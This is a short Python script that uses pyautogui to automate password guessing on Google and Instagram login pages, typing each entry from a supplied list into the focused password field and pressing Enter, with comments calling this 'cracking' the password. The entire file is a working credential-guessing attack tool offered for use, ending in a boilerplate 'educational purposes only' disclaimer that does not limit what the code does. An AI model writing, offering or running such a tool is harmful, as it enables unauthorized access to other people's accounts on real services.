import pyautogui as bot
import time as t

possible_passwords = ''' ''' # add possible passwords here with space in between eg 'password1 password2 password3'

pass_list =list(possible_passwords.split(' '))
# for i in pass_list: 
#     print(i)
# uncomment the above lines to check if the passwords are correctly added to the list
t.sleep(5)
def google():
    for i in pass_list:
        bot.typewrite(i)
        bot.press('enter')
        t.sleep(1)

def instagram():
    for i in pass_list:
        bot.typewrite(i)
        bot.press('enter')
        t.sleep(1)
        bot.click() # place the cursor where the password is to be entered and click to focus on the password field
        bot.hotkey('ctrl', 'a')
        bot.press('backspace')

# call the function according to the website you want to crack the password for
# google()
# instagram()

'''note: this code is for educational purposes only and should not be used for illegal activities. Always ensure you have permission to test the security of any system.
This code is not guaranteed to work and may cause harm to your system if used improperly. Use at your own risk. and also while running the code make sure to have the cursor focused on the password field of the website you want to crack the password for.
to stop the code while its running make sure to run on a terminal and press ctrl + c to stop the execution. make sure to have the necessary permissions to test the security of any system.'''